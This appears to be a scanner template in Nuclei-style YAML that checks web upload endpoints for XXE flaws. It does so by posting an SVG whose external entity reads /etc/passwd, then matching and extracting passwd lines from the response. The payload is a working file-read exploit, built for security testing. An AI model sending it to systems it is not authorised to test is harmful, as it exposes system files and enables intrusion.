id: scanforge-xxe-via-svg

info:
  name: XXE via SVG Upload
  author: ScanForge
  severity: high
  description: The application processes SVG uploads without disabling external entity processing, allowing XXE attacks.
  tags: xxe,svg,upload,xml
  reference:
    - https://portswigger.net/web-security/xxe
    - https://owasp.org/www-project-top-ten/2017/A4_2017-XML_External_Entities_XXE.html

http:
  - method: POST
    path:
      - "{{BaseURL}}/upload"
      - "{{BaseURL}}/api/upload"
      - "{{BaseURL}}/file/upload"
    headers:
      Content-Type: "multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW"
    body: |
      ------WebKitFormBoundary7MA4YWxkTrZu0gW
      Content-Disposition: form-data; name="file"; filename="test.svg"
      Content-Type: image/svg+xml

      <?xml version="1.0" encoding="UTF-8"?>
      <!DOCTYPE svg [
        <!ENTITY xxe SYSTEM "file:///etc/passwd">
      ]>
      <svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
        <text x="10" y="20">&xxe;</text>
      </svg>
      ------WebKitFormBoundary7MA4YWxkTrZu0gW--
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
          - 201
      - type: word
        part: body
        words:
          - "root:"
          - "daemon:"
          - "bin:"
          - "sys:"
        condition: or
    extractors:
      - type: regex
        part: body
        regex:
          - "root:.*:0:0:"